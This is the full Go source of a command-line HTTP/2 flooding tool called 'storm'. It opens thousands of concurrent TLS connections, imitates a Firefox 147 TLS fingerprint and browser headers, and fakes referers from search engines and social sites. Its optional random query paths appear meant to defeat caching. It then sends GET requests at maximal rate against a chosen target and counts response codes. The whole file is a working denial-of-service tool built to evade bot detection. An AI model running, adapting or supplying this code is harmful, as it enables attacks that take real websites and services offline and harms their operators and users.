package main

import (
	"bufio"
	"bytes"
	"context"
	"encoding/binary"
	"fmt"
	"io"
	"math/rand"
	"net"
	"net/url"
	"os"
	"runtime"
	"strconv"
	"strings"
	"sync"
	"sync/atomic"
	"syscall"
	"time"

	"github.com/bogdanfinn/tls-client/profiles"
	utls "github.com/bogdanfinn/utls"
	"golang.org/x/net/http2/hpack"
)

// ── globals ───────────────────────────────────────────────────────────────────

var (
	target    string
	duration  int
	rate      int
	threads   int
	pathFlag  bool
	targetURL *url.URL
	reqCount  uint64
	activeConn int32
	stat2xx   uint64
	stat3xx   uint64
	stat4xx   uint64
	stat5xx   uint64
)

var seedCounter uint64

func nextSeed() int64 { return int64(atomic.AddUint64(&seedCounter, 1)) }

var framePool = sync.Pool{
	New: func() interface{} {
		b := make([]byte, 16384)
		return &b
	},
}

var hblockBufPool = sync.Pool{
	New: func() interface{} { return &bytes.Buffer{} },
}

// ── header data ───────────────────────────────────────────────────────────────

var languages = []string{
	"en-US,en;q=0.9",
	"en-US,en;q=0.9",
	"en-GB,en;q=0.9",
}

var userAgents = []string{
	"Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:147.0) Gecko/20100101 Firefox/147.0",
	"Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:147.0) Gecko/20100101 Firefox/147.0",
	"Mozilla/5.0 (X11; Linux x86_64; rv:147.0) Gecko/20100101 Firefox/147.0",
	"Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:147.0) Gecko/20100101 Firefox/147.0",
}

// ── sec-fetch-site ────────────────────────────────────────────────────────────

const (
	siteNone       = 0
	siteSameOrigin = 1
	siteSameSite   = 2
	siteCrossSite  = 3
)

var siteNames = [4]string{"none", "same-origin", "same-site", "cross-site"}

var siteDistrib = [10]uint8{0, 0, 0, 1, 1, 2, 3, 3, 3, 3}

var crossSiteReferers = []string{
	"https://www.google.com/",
	"https://www.google.com/",
	"https://www.google.com/",
	"https://www.bing.com/",
	"https://duckduckgo.com/",
	"https://yandex.ru/",
	"https://yandex.com/",
	"https://t.co/",
	"https://x.com/",
	"https://l.facebook.com/",
	"https://www.facebook.com/",
	"https://www.reddit.com/",
	"https://news.ycombinator.com/",
	"https://www.youtube.com/",
}

const fullCacheSize = 256

var fullCache [4][2][fullCacheSize][]byte

const (
	pathPlaceholder = "/?AAAAAA=111111" // 15 байт — шаблон, всегда raw ASCII
	pathAlphaOff    = 2                 // offset alphanum внутри path value
	pathDigitOff    = 9                 // offset digits внутри path value
)

const pathChars = "abcdefghijklmnopqrstuvwxyz0123456789"

// pathTmpl хранит template hblock и точный byte offset случайных байт.
type pathTmpl struct {
	data     []byte // полный hblock с placeholder path
	alphaOff int    // byte offset в data: начало 6 alphanum символов
	digitOff int    // byte offset в data: начало 6 цифр
}

// pathTmpls[siteIdx][withUser][blockIdx] — 2048 шаблонов (4×2×256).
// Каждый шаблон имеет уникальный UA + language, зафиксированные при старте.
// Hot path: +1 Uint32 vs 8-шаблонной версии — разница ~0.3ns.
var pathTmpls [4][2][256]pathTmpl

func buildHblockTemplate(host, path, referer, site string, rng *rand.Rand, withSecFetchUser bool) ([]byte, int, int) {
	hbuf := hblockBufPool.Get().(*bytes.Buffer)
	hbuf.Reset()
	defer hblockBufPool.Put(hbuf)
	enc := hpack.NewEncoder(hbuf)
	enc.SetMaxDynamicTableSize(65536)
	enc.WriteField(hpack.HeaderField{Name: ":method", Value: "GET"})

	// Записываем :path вручную — гарантированно raw ASCII без Huffman.
	// HPACK: literal never-indexed, name = static table index 4 (:path).
	preLen := hbuf.Len() // offset начала поля :path в hbuf
	hbuf.WriteByte(0x14) // never-indexed prefix + static name index 4
	hbuf.WriteByte(byte(len(path))) // length без huffman флага (бит 7 = 0); len=15 < 128
	hbuf.WriteString(path)          // raw ASCII value — патчируем здесь

	enc.WriteField(hpack.HeaderField{Name: ":authority", Value: host})
	enc.WriteField(hpack.HeaderField{Name: ":scheme",    Value: "https"})
	enc.WriteField(hpack.HeaderField{Name: "user-agent",
		Value: userAgents[rng.Intn(len(userAgents))]})
	enc.WriteField(hpack.HeaderField{Name: "accept",
		Value: "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8"})
	enc.WriteField(hpack.HeaderField{Name: "accept-language",
		Value: languages[rng.Intn(len(languages))]})
	enc.WriteField(hpack.HeaderField{Name: "accept-encoding", Value: "gzip, deflate, br, zstd"})
	if referer != "" {
		enc.WriteField(hpack.HeaderField{Name: "referer", Value: referer})
	}
	enc.WriteField(hpack.HeaderField{Name: "upgrade-insecure-requests", Value: "1"})
	enc.WriteField(hpack.HeaderField{Name: "sec-fetch-dest", Value: "document"})
	enc.WriteField(hpack.HeaderField{Name: "sec-fetch-mode", Value: "navigate"})
	enc.WriteField(hpack.HeaderField{Name: "sec-fetch-site", Value: site})
	if withSecFetchUser {
		enc.WriteField(hpack.HeaderField{Name: "sec-fetch-user", Value: "?1"})
	}
	enc.WriteField(hpack.HeaderField{Name: "priority", Value: "u=0, i"})
	enc.WriteField(hpack.HeaderField{Name: "te", Value: "trailers"})

	hpackLen := hbuf.Len()
	result := make([]byte, 5+hpackLen)
	copy(result[0:5], priorityData[:])
	copy(result[5:], hbuf.Bytes())

	// value начинается на: 5 (priorityData) + preLen (байт до :path) + 2 (prefix+length байт)
	valueStart := 5 + preLen + 2
	return result, valueStart + pathAlphaOff, valueStart + pathDigitOff
}

func initPathTmpls(host string) {
	r := rand.New(rand.NewSource(nextSeed()))
	basePath := targetURL.Path
	if basePath == "" {
		basePath = "/"
	}
	sameRef := "https://" + host + basePath

	for siteIdx := 0; siteIdx < 4; siteIdx++ {
		for userIdx := 0; userIdx < 2; userIdx++ {
			for blockIdx := 0; blockIdx < 256; blockIdx++ {
				var referer string
				switch siteIdx {
				case siteSameOrigin, siteSameSite:
					referer = sameRef
				case siteCrossSite:
					referer = crossSiteReferers[r.Intn(len(crossSiteReferers))]
				}
				// buildHblockTemplate рандомит UA + language уникально для каждого из 256 блоков
				// site=none → прямая навигация → Firefox ВСЕГДА добавляет sec-fetch-user: ?1
				withUser := userIdx == 1 || siteIdx == siteNone
				hb, aOff, dOff := buildHblockTemplate(
					host, pathPlaceholder, referer, siteNames[siteIdx], r, withUser,
				)
				pathTmpls[siteIdx][userIdx][blockIdx] = pathTmpl{
					data:     hb,
					alphaOff: aOff,
					digitOff: dOff,
				}
			}
		}
	}
}

// makePathHblock создаёт hblock с уникальным случайным путём.
// 1 alloc (~240 байт) + copy + patch 12 байт = ~35ns, 0 HPACK encode.
func makePathHblock(tmpl *pathTmpl, rng *rand.Rand) []byte {
	dst := make([]byte, len(tmpl.data))
	copy(dst, tmpl.data)

	// Patch 6 alphanum символов
	for i := 0; i < 6; i++ {
		dst[tmpl.alphaOff+i] = pathChars[rng.Uint32()%36]
	}

	// Patch 6 цифр (число 100000–999999, всегда ровно 6 цифр)
	n := int(rng.Int63n(899999)) + 100000
	for i := 5; i >= 0; i-- {
		dst[tmpl.digitOff+i] = byte('0' + n%10)
		n /= 10
	}

	return dst
}

func initFullCache(host string) {
	r := rand.New(rand.NewSource(nextSeed()))
	basePath := targetURL.Path
	if basePath == "" {
		basePath = "/"
	}
	sameRef := "https://" + host + basePath
	for siteIdx := 0; siteIdx < 4; siteIdx++ {
		for userIdx := 0; userIdx < 2; userIdx++ {
			for i := 0; i < fullCacheSize; i++ {
				var referer string
				switch siteIdx {
				case siteNone:
					referer = ""
				case siteSameOrigin, siteSameSite:
					referer = sameRef
				case siteCrossSite:
					referer = crossSiteReferers[r.Intn(len(crossSiteReferers))]
				}
				// site=none → прямая навигация → Firefox ВСЕГДА добавляет sec-fetch-user: ?1
				withUser := userIdx == 1 || siteIdx == siteNone
				fullCache[siteIdx][userIdx][i] = buildHblock(
					host, basePath, referer, siteNames[siteIdx], r, withUser,
				)
			}
		}
	}
}

func buildHblock(host, path, referer, site string, rng *rand.Rand, withSecFetchUser bool) []byte {
	hbuf := hblockBufPool.Get().(*bytes.Buffer)
	hbuf.Reset()
	defer hblockBufPool.Put(hbuf)
	enc := hpack.NewEncoder(hbuf)
	enc.SetMaxDynamicTableSize(65536)
	enc.WriteField(hpack.HeaderField{Name: ":method",    Value: "GET"})
	enc.WriteField(hpack.HeaderField{Name: ":path",      Value: path})
	enc.WriteField(hpack.HeaderField{Name: ":authority", Value: host})
	enc.WriteField(hpack.HeaderField{Name: ":scheme",    Value: "https"})
	enc.WriteField(hpack.HeaderField{Name: "user-agent",
		Value: userAgents[rng.Intn(len(userAgents))]})
	enc.WriteField(hpack.HeaderField{Name: "accept",
		Value: "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8"})
	enc.WriteField(hpack.HeaderField{Name: "accept-language",
		Value: languages[rng.Intn(len(languages))]})
	enc.WriteField(hpack.HeaderField{Name: "accept-encoding", Value: "gzip, deflate, br, zstd"})
	if referer != "" {
		enc.WriteField(hpack.HeaderField{Name: "referer", Value: referer})
	}
	enc.WriteField(hpack.HeaderField{Name: "upgrade-insecure-requests", Value: "1"})
	enc.WriteField(hpack.HeaderField{Name: "sec-fetch-dest", Value: "document"})
	enc.WriteField(hpack.HeaderField{Name: "sec-fetch-mode", Value: "navigate"})
	enc.WriteField(hpack.HeaderField{Name: "sec-fetch-site", Value: site})
	if withSecFetchUser {
		enc.WriteField(hpack.HeaderField{Name: "sec-fetch-user", Value: "?1"})
	}
	enc.WriteField(hpack.HeaderField{Name: "priority", Value: "u=0, i"})
	enc.WriteField(hpack.HeaderField{Name: "te", Value: "trailers"})

	hpackLen := hbuf.Len()
	result := make([]byte, 5+hpackLen)
	copy(result[0:5], priorityData[:])
	copy(result[5:], hbuf.Bytes())
	return result
}

const clientPreface = "PRI * HTTP/2.0\r\n\r\nSM\r\n\r\n"

const (
	frameDATA         byte = 0x0
	frameHEADERS      byte = 0x1
	frameRSTSTREAM    byte = 0x3
	frameSETTINGS     byte = 0x4
	framePING         byte = 0x6
	frameGOAWAY       byte = 0x7
	frameWINDOWUPDATE byte = 0x8

	flagEND_STREAM  byte = 0x1
	flagEND_HEADERS byte = 0x4
	flagACK         byte = 0x1
	flagPADDED      byte = 0x8
	flagPRIORITYf   byte = 0x20

	settingMaxConcurrentStreams uint16 = 0x3
	settingInitialWindowSize    uint16 = 0x4
)

const (
	streamIDLimit uint32        = 0x7FFFFF00
	readDeadline  time.Duration = 30 * time.Second
)

var errStreamLimit = fmt.Errorf("stream limit")
var errConnDone    = fmt.Errorf("conn done")

var priorityData = [5]byte{0x00, 0x00, 0x00, 0x00, 0x28} // weight=41

// ── helpers ───────────────────────────────────────────────────────────────────

func settingBytes(id uint16, val uint32) []byte {
	b := make([]byte, 6)
	binary.BigEndian.PutUint16(b[0:], id)
	binary.BigEndian.PutUint32(b[2:], val)
	return b
}

func writeU32BE(dst []byte, v uint32) {
	dst[0] = byte(v >> 24)
	dst[1] = byte(v >> 16)
	dst[2] = byte(v >> 8)
	dst[3] = byte(v)
}

func buildPath(rng *rand.Rand) string {
	p := targetURL.Path
	if p == "" {
		p = "/"
	}
	p += fmt.Sprintf("?%s=%d", randStr(rng, 6), rng.Int63n(899999)+100000)
	return p
}

func randStr(rng *rand.Rand, n int) string {
	const c = "abcdefghijklmnopqrstuvwxyz0123456789"
	b := make([]byte, n)
	for i := range b {
		b[i] = c[rng.Intn(len(c))]
	}
	return string(b)
}

func countStatus(code int) {
	switch {
	case code >= 200 && code < 300:
		atomic.AddUint64(&stat2xx, 1)
	case code >= 300 && code < 400:
		atomic.AddUint64(&stat3xx, 1)
	case code >= 400 && code < 500:
		atomic.AddUint64(&stat4xx, 1)
	case code >= 500:
		atomic.AddUint64(&stat5xx, 1)
	}
}

// ── h2Conn ────────────────────────────────────────────────────────────────────

type writeReq struct {
	frameType byte
	flags     byte
	streamID  uint32
	payload   []byte
}

type h2Conn struct {
	conn         net.Conn
	bw           *bufio.Writer
	writeCh      chan writeReq
	nextID       uint32
	done         chan struct{}
	closeOnce    sync.Once
	decoder      *hpack.Decoder
	peerInitWin  int32
	maxStreams    uint32
	activeStreams int32
}

func newH2Conn(conn net.Conn) (*h2Conn, error) {
	c := &h2Conn{
		conn:        conn,
		bw:          bufio.NewWriterSize(conn, 32768),
		writeCh:     make(chan writeReq, 512),
		nextID:      1,
		done:        make(chan struct{}),
		decoder:     hpack.NewDecoder(65536, nil),
		peerInitWin: 65535,
		maxStreams:  1000,
	}

	c.bw.WriteString(clientPreface)
	var sp []byte	
	sp = append(sp, settingBytes(0x1, 65536)...)
	sp = append(sp, settingBytes(0x2, 0)...)
	sp = append(sp, settingBytes(0x4, 131072)...)
	sp = append(sp, settingBytes(0x5, 16384)...)
	c.writeFrameDirect(frameSETTINGS, 0, 0, sp)
	c.writeFrameDirect(frameWINDOWUPDATE, 0, 0, []byte{0x00, 0xBF, 0x00, 0x01})
	if err := c.bw.Flush(); err != nil {
		return nil, err
	}

	go c.writer()
	go c.reader()
	return c, nil
}

func (c *h2Conn) writeFrameDirect(ft, flags byte, sid uint32, payload []byte) {
	l := len(payload)
	hdr := [9]byte{
		byte(l >> 16), byte(l >> 8), byte(l),
		ft, flags,
		byte(sid >> 24), byte(sid >> 16), byte(sid >> 8), byte(sid),
	}
	c.bw.Write(hdr[:])
	if l > 0 {
		c.bw.Write(payload)
	}
}

func (c *h2Conn) close() {
	c.closeOnce.Do(func() {
		close(c.done)
		c.conn.Close()
	})
}

func (c *h2Conn) isDone() bool {
	select {
	case <-c.done:
		return true
	default:
		return false
	}
}

func (c *h2Conn) streamExhausted() bool {
	return atomic.LoadUint32(&c.nextID) >= streamIDLimit
}

func (c *h2Conn) enqueue(req writeReq) error {
	select {
	case c.writeCh <- req:
		return nil
	case <-c.done:
		return errConnDone
	}
}

func (c *h2Conn) writer() {
	defer c.close()
	for {
		select {
		case <-c.done:
			return
		case req := <-c.writeCh:
			c.writeFrameDirect(req.frameType, req.flags, req.streamID, req.payload)
		}
	drain:
		for {
			select {
			case req := <-c.writeCh:
				c.writeFrameDirect(req.frameType, req.flags, req.streamID, req.payload)
			default:
				break drain
			}
		}
		if err := c.bw.Flush(); err != nil {
			return
		}
	}
}

func (c *h2Conn) reader() {
	defer c.close()
	br := bufio.NewReaderSize(c.conn, 32768)
	var wuBuf [4]byte

	for {
		c.conn.SetReadDeadline(time.Now().Add(readDeadline))

		var hdr [9]byte
		if _, err := io.ReadFull(br, hdr[:]); err != nil {
			return
		}
		length := int(hdr[0])<<16 | int(hdr[1])<<8 | int(hdr[2])
		ft     := hdr[3]
		flags  := hdr[4]
		sid    := binary.BigEndian.Uint32(hdr[5:]) & 0x7FFFFFFF

		var payload []byte
		var bp *[]byte
		if length > 0 {
			bp = framePool.Get().(*[]byte)
			if cap(*bp) < length {
				*bp = make([]byte, length)
			}
			payload = (*bp)[:length]
			if _, err := io.ReadFull(br, payload); err != nil {
				framePool.Put(bp)
				return
			}
		}

		switch ft {
		case frameSETTINGS:
			if flags&flagACK == 0 {
				for j := 0; j+6 <= len(payload); j += 6 {
					pid  := binary.BigEndian.Uint16(payload[j : j+2])
					pval := binary.BigEndian.Uint32(payload[j+2 : j+6])
					switch pid {
					case settingMaxConcurrentStreams:
						atomic.StoreUint32(&c.maxStreams, pval)
					case settingInitialWindowSize:
						nw := int32(pval)
						ow := atomic.SwapInt32(&c.peerInitWin, nw)
						if d := nw - ow; d > 0 {
							writeU32BE(wuBuf[:], uint32(d))
							p := make([]byte, 4)
							copy(p, wuBuf[:])
							c.enqueue(writeReq{frameWINDOWUPDATE, 0, 0, p})
						}
					}
				}
				c.enqueue(writeReq{frameSETTINGS, flagACK, 0, nil})
			}

		case framePING:
			if flags&flagACK == 0 {
				d := make([]byte, len(payload))
				copy(d, payload)
				c.enqueue(writeReq{framePING, flagACK, 0, d})
			}

		case frameHEADERS:
			atomic.AddInt32(&c.activeStreams, -1)
			data := payload
			if flags&flagPADDED != 0 && len(data) > 0 {
				pad := int(data[0])
				if pad < len(data) {
					data = data[1 : len(data)-pad]
				}
			}
			if flags&flagPRIORITYf != 0 && len(data) >= 5 {
				data = data[5:]
			}
			if hf, err := c.decoder.DecodeFull(data); err == nil {
				for _, h := range hf {
					if h.Name == ":status" {
						code, _ := strconv.Atoi(h.Value)
						countStatus(code)
						break
					}
				}
			}

		case frameDATA:
			if length > 0 {
				writeU32BE(wuBuf[:], uint32(length))
				p1 := make([]byte, 4)
				copy(p1, wuBuf[:])
				c.enqueue(writeReq{frameWINDOWUPDATE, 0, 0, p1})
				p2 := make([]byte, 4)
				copy(p2, wuBuf[:])
				c.enqueue(writeReq{frameWINDOWUPDATE, 0, sid, p2})
			}

		case frameRSTSTREAM:
			atomic.AddInt32(&c.activeStreams, -1)

		case frameGOAWAY:
			if bp != nil {
				framePool.Put(bp)
			}
			return
		}

		if bp != nil {
			framePool.Put(bp)
		}
	}
}

func (c *h2Conn) sendRequest(hblock []byte) error {
	if uint32(atomic.LoadInt32(&c.activeStreams)) >= atomic.LoadUint32(&c.maxStreams) {
		return errStreamLimit
	}
	sid := atomic.AddUint32(&c.nextID, 2) - 2
	atomic.AddInt32(&c.activeStreams, 1)
	return c.enqueue(writeReq{frameHEADERS, flagEND_STREAM 	| flagEND_HEADERS | flagPRIORITYf, sid, hblock})
}

// ── init / main ───────────────────────────────────────────────────────────────

func init() {
	runtime.GOMAXPROCS(runtime.NumCPU())
	var rl syscall.Rlimit
	if err := syscall.Getrlimit(syscall.RLIMIT_NOFILE, &rl); err == nil {
		rl.Cur = rl.Max
		syscall.Setrlimit(syscall.RLIMIT_NOFILE, &rl)
	}
}

func main() {
	if len(os.Args) < 5 {
		fmt.Println("Usage: ./storm <target> <time> <rate> <threads> [--path]")
		os.Exit(1)
	}

	target      = os.Args[1]
	duration, _ = strconv.Atoi(os.Args[2])
	rate, _     = strconv.Atoi(os.Args[3])
	threads, _  = strconv.Atoi(os.Args[4])
	pathFlag    = len(os.Args) > 5 && os.Args[5] == "--path"

	var err error
	targetURL, err = url.Parse(target)
	if err != nil {
		fmt.Println("Invalid target URL:", err)
		os.Exit(1)
	}

	initFullCache(targetURL.Host)
	if pathFlag {
		initPathTmpls(targetURL.Host)
	}

	fmt.Printf("Target:   %s\n", target)
	fmt.Printf("Duration: %d sec | Rate: %d req/conn | Threads: %d | Direct (no proxy)\n",
		duration, rate, threads)
	fmt.Println("TLS:      Firefox 147 (bogdanfinn/utls)")
	fmt.Println("H2:       site-rotation + referer + 2048 cache | Uint32 hot path")

	ctx, cancel := context.WithTimeout(context.Background(), time.Duration(duration)*time.Second)
	defer cancel()

	sem := make(chan struct{}, 6000)
	for i := 0; i < threads; i++ {
		go func() {
			for {
				select {
				case <-ctx.Done():
					return
				case sem <- struct{}{}:
					go func() {
						defer func() { <-sem }()
						runFlooder(ctx)
					}()
				}
			}
		}()
	}

	go func() {
		ticker := time.NewTicker(time.Second)
		defer ticker.Stop()
		var last uint64
		var hist [10]int
		idx, start := 0, time.Now()
		for {
			select {
			case <-ctx.Done():
				return
			case <-ticker.C:
				cur := atomic.LoadUint64(&reqCount)
				rps := int(cur - last)
				last = cur
				hist[idx%10] = rps
				idx++
				avg := 0
				for _, v := range hist {
					avg += v
				}
				avg /= 10
				fmt.Printf(
					"\r[%d/%ds] RPS:%-6d Avg:%-6d Total:%-8d Active:%-4d | 2xx:%-7d 3xx:%-5d 4xx:%-7d 5xx:%-5d",
					int(time.Since(start).Seconds()), duration,
					rps, avg, cur,
					atomic.LoadInt32(&activeConn),
					atomic.LoadUint64(&stat2xx),
					atomic.LoadUint64(&stat3xx),
					atomic.LoadUint64(&stat4xx),
					atomic.LoadUint64(&stat5xx),
				)
			}
		}
	}()

	<-ctx.Done()
	total := atomic.LoadUint64(&reqCount)
	fmt.Printf("\n\nDone. Total: %d | Avg RPS: %.0f\n", total, float64(total)/float64(duration))
	fmt.Printf("2xx:%-8d 3xx:%-6d 4xx:%-8d 5xx:%-6d\n",
		atomic.LoadUint64(&stat2xx),
		atomic.LoadUint64(&stat3xx),
		atomic.LoadUint64(&stat4xx),
		atomic.LoadUint64(&stat5xx),
	)
}

// ── runFlooder ────────────────────────────────────────────────────────────────

func runFlooder(ctx context.Context) {
	defer func() { recover() }()

	atomic.AddInt32(&activeConn, 1)
	defer atomic.AddInt32(&activeConn, -1)

	host := targetURL.Host

	rawConn, err := dialDirect(ctx, host)
	if err != nil {
		return
	}

	tlsConn := utls.UClient(rawConn, &utls.Config{
		ServerName:         host,
		InsecureSkipVerify: true,
	}, profiles.Firefox_147.GetClientHelloId(), false, false, false)

	tlsConn.SetDeadline(time.Now().Add(5 * time.Second))
	if err := tlsConn.HandshakeContext(ctx); err != nil {
		rawConn.Close()
		return
	}
	tlsConn.SetDeadline(time.Time{})

	if tlsConn.ConnectionState().NegotiatedProtocol != "h2" {
		tlsConn.Close()
		return
	}

	h2c, err := newH2Conn(tlsConn)
	if err != nil {
		tlsConn.Close()
		return
	}
	defer h2c.close()

	var wg sync.WaitGroup
	for i := 0; i < rate; i++ {
		wg.Add(1)
		rng := rand.New(rand.NewSource(nextSeed()))
		go func(rng *rand.Rand) {
			defer wg.Done()
			for {
				select {
				case <-ctx.Done():
					return
				default:
				}
				if h2c.isDone() || h2c.streamExhausted() {
					return
				}

				var hblock []byte
				if pathFlag {
					// ── PATH HOT PATH — template patching ────────────────────
					// 2048 вариаций: уникальный path + уникальный UA/language.
					// 4×Uint32 + array lookup + copy(~240B) + patch 12B = ~35ns
					siteIdx  := siteDistrib[rng.Uint32()%10]
					uidx     := 0
					if rng.Uint32()%10 < 9 || siteIdx == siteNone {
						uidx = 1
					}
					blockIdx := rng.Uint32() & 0xFF
					hblock = makePathHblock(&pathTmpls[siteIdx][uidx][blockIdx], rng)
				} else {
					// ── ГОРЯЧИЙ ПУТЬ ─────────────────────────────────────────
					
					// Здесь только 3×Uint32 + 2 array lookup = ~6ns, 0 аллокаций.
					siteIdx  := siteDistrib[rng.Uint32()%10]
					blockIdx := rng.Uint32() & 0xFF
					if rng.Uint32()%10 < 8 { // 90% с sec-fetch-user
						hblock = fullCache[siteIdx][1][blockIdx]
					} else {
						hblock = fullCache[siteIdx][0][blockIdx]
					}
				}

				err := h2c.sendRequest(hblock)
				if err == errStreamLimit {
					runtime.Gosched()
					continue
				}
				if err != nil {
					return
				}
				atomic.AddUint64(&reqCount, 1)
			}
		}(rng)
	}

	wg.Wait()
}

// ── dialDirect ────────────────────────────────────────────────────────────────

func dialDirect(ctx context.Context, targetHost string) (net.Conn, error) {
	host := targetHost
	if !strings.Contains(host, ":") {
		host = host + ":443"
	}
	dialer := &net.Dialer{Timeout: 5 * time.Second}
	conn, err := dialer.DialContext(ctx, "tcp", host)
	if err != nil {
		return nil, err
	}
	if tc, ok := conn.(*net.TCPConn); ok {
		tc.SetKeepAlive(true)
		tc.SetKeepAlivePeriod(60 * time.Second)
	}
	return conn, nil
}
